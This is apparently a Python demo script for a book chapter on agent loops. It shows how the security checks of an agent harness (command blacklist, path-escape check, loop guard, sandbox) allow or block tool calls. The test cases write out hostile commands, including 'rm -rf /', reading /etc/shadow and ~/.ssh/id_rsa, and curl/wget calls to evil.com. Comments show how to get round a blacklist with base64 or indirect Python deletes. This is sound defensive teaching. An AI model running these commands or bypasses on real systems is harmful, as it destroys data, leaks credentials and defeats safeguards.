"""
第3章 最小Agent循环 + 安全实验
==============================
演示三轮安全约束迭代，全部使用真实框架代码。
无需API key，无需外部依赖。

用法: python examples/ch03_agent_loop.py
"""

import sys
sys.path.insert(0, '.')

import tempfile
from pathlib import Path

from harness_py.config import AgentConfig
from harness_py.tools import execute_tool, _check_path_escape
from harness_py.loop_guard import LoopGuard
from harness_py_pro.sandbox import Sandbox, NetworkPolicy, FilesystemPolicy, PermissionMode


# ======================================================================
# 第一轮：零约束 —— execute_tool不启用安全检查
# ======================================================================

def demo_round1():
    """第一轮：用execute_tool, 权限全开, 无命令黑名单。"""
    print('=== 第一轮：零约束 ===')
    print('使用execute_tool(), allow_write=True, allow_shell=True, allow_destructive=True')
    print('（路径遍历检查是工具内置的，但bash命令不受任何限制）\n')

    with tempfile.TemporaryDirectory() as d:
        cwd = Path(d)
        (cwd / 'secret.txt').write_text('sensitive data')

        # 完全放开：允许写、允许shell、允许destructive
        config = AgentConfig(
            cwd=cwd,
            allow_write=True,
            allow_shell=True,
            allow_destructive=True,
        )

        attacks = [
            ('bash', {'command': 'echo "rm -rf /" && echo "executed"'},
             '危险命令直接执行'),
            ('bash', {'command': 'cat /etc/shadow 2>/dev/null || echo "无权限但未拦截"'},
             '读敏感文件未拦截'),
            ('bash', {'command': 'python -c "import shutil; print(\'shutil.rmtree可用\')"'},
             '任意Python代码未拦截'),
            ('write_file', {'path': 'malware.py', 'content': 'import socket\nsocket.connect(("evil.com", 80))'},
             '写入网络攻击脚本未拦截'),
        ]

        for tool_name, tool_args, desc in attacks:
            ok, result = execute_tool(tool_name, tool_args, config)
            status = 'ALLOW' if ok else 'BLOCK'
            print(f'  {tool_name}({_brief(tool_args)}) -> {status}  ({desc})')

        print('  结论: 权限全开时, bash可执行任何命令, 无安全边界\n')


# ======================================================================
# 第二轮：简单黑名单 —— allow_destructive=False 但可被绕过
# ======================================================================

def demo_round2():
    """第二轮：命令黑名单 + 路径写保护，但可被绕过。"""
    print('=== 第二轮：命令黑名单（可被绕过） ===')
    print('使用execute_tool(), allow_write=True, allow_destructive=False\n')

    with tempfile.TemporaryDirectory() as d:
        cwd = Path(d)
        # 创建一个文件供操作
        (cwd / 'data.db').write_text('important data')

        config = AgentConfig(
            cwd=cwd,
            allow_write=True,
            allow_shell=True,
            allow_destructive=False,  # 开启命令黑名单
        )

        test_cases = [
            # 正常操作 - 允许
            ('write_file', {'path': 'src/main.py', 'content': 'print("hello")'}, '白名单内写入'),
            # 直接rm -rf - 被黑名单拦截
            ('bash', {'command': 'rm -rf /tmp/important'}, '命令黑名单拦截'),
            # 绕过：用Python脚本间接删除 - 黑名单检测不到
            ('bash', {'command': 'python -c "import os; os.remove(\'data.db\')"'}, '间接绕过！'),
            # 绕过：用base64编码 - 黑名单检测不到
            ('bash', {'command': 'echo cm0gLXJmIC90bXA= | base64 -d'}, '编码绕过！'),
        ]

        for tool_name, tool_args, desc in test_cases:
            ok, result = execute_tool(tool_name, tool_args, config)
            status = 'ALLOW' if ok else 'BLOCK'
            print(f'  {tool_name}({_brief(tool_args)}) -> {status}  ({desc})')

        print('  结论: Agent通过写脚本/编码等方式绕过了简单黑名单\n')


# ======================================================================
# 第三轮：框架级路径安全检查（_check_path_escape）
# ======================================================================

def demo_round3():
    """第三轮：使用_check_path_escape()实现框架级路径安全。"""
    print('=== 第三轮：框架级路径安全检查 ===')
    print('使用_check_path_escape()检测路径遍历攻击\n')

    with tempfile.TemporaryDirectory() as d:
        ac = AgentConfig(cwd=Path(d))
        attacks = [
            ('正常路径', 'src/main.py', True),
            ('路径遍历', '../../etc/passwd', False),
            ('绝对路径', '/etc/shadow', False),
            ('Unicode遍历', 'src/..\\..\\etc\\passwd', False),
        ]
        for name, path, should_ok in attacks:
            ok, reason = _check_path_escape(ac, path)
            status = 'ALLOW' if ok else 'BLOCK'
            expected = 'OK' if ok == should_ok else 'UNEXPECTED!'
            print(f'  {name}: {path} -> {status} [{expected}]')
            if reason:
                print(f'    原因: {reason}')

        print('  结论: 路径遍历和绝对路径攻击被框架级检查拦截\n')


# ======================================================================
# 附加演示：LoopGuard 死循环检测
# ======================================================================

def demo_loop_guard():
    """演示LoopGuard检测死循环（无需API）。"""
    print('=== LoopGuard 死循环检测 ===')
    print('模拟Agent反复调用同一工具的场景\n')

    guard = LoopGuard(
        max_identical_calls=3,
        max_consecutive_errors=3,
        max_same_tool_streak=5,
    )

    # 场景1：完全相同的调用（死循环）
    print('  场景1: 完全相同的调用')
    guard.reset()
    for i in range(4):
        intervene, msg = guard.check(
            'read_file',
            {'path': 'config.json'},
            result_ok=True,
            result_preview='{"key": "value"}',
        )
        if intervene:
            print(f'    第{i+1}次 -> 介入: {msg}')
            break
        else:
            print(f'    第{i+1}次 -> 正常')

    # 场景2：连续错误
    print('  场景2: 连续错误')
    guard.reset()
    for i in range(4):
        intervene, msg = guard.check(
            'bash',
            {'command': f'python nonexistent_{i}.py'},
            result_ok=False,
            result_preview='FileNotFoundError',
        )
        if intervene:
            print(f'    第{i+1}次 -> 介入: {msg}')
            break
        else:
            print(f'    第{i+1}次 -> 继续（错误计数: {guard._consecutive_errors}）')

    # 场景3：正常多样化调用
    print('  场景3: 正常多样化调用')
    guard.reset()
    tools = [
        ('read_file', {'path': 'a.py'}),
        ('grep_search', {'pattern': 'def '}),
        ('read_file', {'path': 'b.py'}),
    ]
    for tool_name, tool_args in tools:
        intervene, msg = guard.check(tool_name, tool_args, True, 'ok')
        status = '介入' if intervene else '正常'
        print(f'    {tool_name} -> {status}')

    print()


# ======================================================================
# 附加演示：Sandbox.check_tool_call() 沙箱级安全
# ======================================================================

def demo_sandbox():
    """演示Sandbox综合安全检查（无需API）。"""
    print('=== Sandbox 沙箱级安全 ===')
    print('Sandbox = 网络隔离 + 文件系统隔离 + 权限模式\n')

    with tempfile.TemporaryDirectory() as d:
        cwd = Path(d)

        sandbox = Sandbox(
            cwd=cwd,
            permission_mode=PermissionMode.BYPASS,  # 不走用户确认
            network=NetworkPolicy(deny_by_default=True),
            filesystem=FilesystemPolicy(
                allowed_roots=[cwd],
                block_sensitive=True,
            ),
        )

        test_cases = [
            # 正常操作
            ('read_file', {'path': 'src/main.py'}, True, '正常读取'),
            ('write_file', {'path': 'src/out.py', 'content': 'ok'}, True, '正常写入'),
            # 网络隔离
            ('bash', {'command': 'curl https://evil.com/steal'}, False, '网络命令拦截'),
            ('bash', {'command': 'wget http://malware.com/payload'}, False, '下载拦截'),
            ('write_file', {'path': 'exploit.py', 'content': 'import requests\nrequests.get("http://evil.com")'}, False, '网络模块拦截'),
            # 文件系统隔离
            ('bash', {'command': 'rm -rf /'}, False, '危险命令拦截'),
            ('bash', {'command': 'git push --force'}, False, 'force push拦截'),
            # 敏感路径保护
            ('read_file', {'path': '../.ssh/id_rsa'}, False, '敏感路径保护'),
        ]

        for tool_name, tool_args, expect_ok, desc in test_cases:
            ok, reason = sandbox.check_tool_call(tool_name, tool_args)
            status = 'ALLOW' if ok else 'BLOCK'
            match = 'OK' if ok == expect_ok else 'UNEXPECTED!'
            print(f'  {tool_name}({_brief(tool_args)}) -> {status}  ({desc}) [{match}]')
            if reason:
                print(f'    原因: {reason}')

        stats = sandbox.stats
        print(f'\n  沙箱统计: 检查{stats["checks"]}次, 拦截{stats["blocks"]}次')
        print(f'  结论: 沙箱从执行环境层面实现deny-by-default安全策略\n')


# ======================================================================
# 辅助函数
# ======================================================================

def _brief(args: dict) -> str:
    """简要显示工具参数。"""
    if 'command' in args:
        return args['command'][:50]
    if 'path' in args:
        return args['path']
    return str(args)[:50]


# ======================================================================
# 入口
# ======================================================================

if __name__ == '__main__':
    demo_round1()
    demo_round2()
    demo_round3()
    demo_loop_guard()
    demo_sandbox()
